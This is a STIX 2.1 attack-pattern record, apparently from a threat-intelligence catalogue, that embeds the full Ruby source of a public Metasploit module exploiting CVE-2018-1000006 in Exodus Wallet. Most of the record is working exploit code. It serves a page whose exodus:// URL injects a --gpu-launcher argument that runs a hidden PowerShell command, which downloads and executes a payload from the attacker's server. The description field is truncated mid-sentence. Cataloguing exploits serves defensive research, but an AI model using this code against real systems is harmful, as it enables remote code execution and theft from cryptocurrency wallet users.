{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--cb400c54-820c-4db7-a57c-df011a69ac56",
    "created": "2024-08-14T16:41:13.354922Z",
    "modified": "2024-08-14T16:41:13.354927Z",
    "name": "Exodus Wallet (ElectronJS Framework) remote Code Execution",
    "description": "( This module exploits a Remote Code Execution vulnerability in Exodus Wallet a vulnerability in the ElectronJS Framework protocol handler can be used to",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/exodus.rb",
            "external_id": "exodus.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-1000006"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ManualRanking\n\n  include Msf::Exploit::EXE\n  include Msf::Exploit::Powershell\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'         => 'Exodus Wallet (ElectronJS Framework) remote Code Execution',\n      'Description'  => %q(\n         This module exploits a Remote Code Execution vulnerability in Exodus Wallet,\n         a vulnerability in the ElectronJS Framework protocol handler can be used to\n         get arbitrary command execution if the user clicks on a specially crafted URL.\n      ),\n      'License'      => MSF_LICENSE,\n      'Author'       =>\n        [\n          'Wflki',          # Original exploit author\n          'Daniel Teixeira' # MSF module author\n        ],\n      'DefaultOptions' =>\n        {\n          'SRVPORT'    => '80',\n          'URIPATH'    => '/',\n        },\n      'References'     =>\n        [\n          [ 'EDB', '43899' ],\n          [ 'BID', '102796' ],\n          [ 'CVE', '2018-1000006' ],\n        ],\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          ['PSH (Binary)', {\n            'Platform' => 'win',\n            'Arch' => [ARCH_X86, ARCH_X64]\n          }]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2018-01-25'\n    ))\n\n  register_advanced_options(\n    [\n      OptBool.new('PSH-Proxy', [ true,  'PSH - Use the system proxy', true ]),\n    ], self.class\n  )\n  end\n\n  def gen_psh(url)\n      ignore_cert = Rex::Powershell::PshMethods.ignore_ssl_certificate if ssl\n\n      download_string = datastore['PSH-Proxy'] ? (Rex::Powershell::PshMethods.proxy_aware_download_and_exec_string(url)) : (Rex::Powershell::PshMethods.download_and_exec_string(url))\n\n      download_and_run = \"#{ignore_cert}#{download_string}\"\n\n      return generate_psh_command_line(noprofile: true, windowstyle: 'hidden', command: download_and_run)\n  end\n\n  def serve_payload(cli)\n   data = cmd_psh_payload(payload.encoded,\n      payload_instance.arch.first,\n      remove_comspec: true,\n      exec_in_place: true\n    )\n\n    print_status(\"Delivering Payload\")\n    send_response_html(cli, data, 'Content-Type' => 'application/octet-stream')\n  end\n\n  def serve_page(cli)\n    psh = gen_psh(\"#{get_uri}payload\")\n    psh_escaped = psh.gsub(\"\\\\\",\"\\\\\\\\\\\\\\\\\").gsub(\"'\",\"\\\\\\\\'\")\n    val = rand_text_alpha(5)\n\n    html = %Q|<html>\n<!doctype html>\n<script>\n  window.location = 'exodus://#{val}\" --gpu-launcher=\"cmd.exe /k #{psh_escaped}\" --#{val}='\n</script>\n</html>\n|\n    send_response_html(cli, html)\n  end\n\n  def on_request_uri(cli, request)\n    case request.uri\n    when /payload$/\n      serve_payload(cli)\n    else\n      serve_page(cli)\n    end\n  end\n\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2018-01-25",
    "x_mitre_platforms": [
        "win'"
    ]
}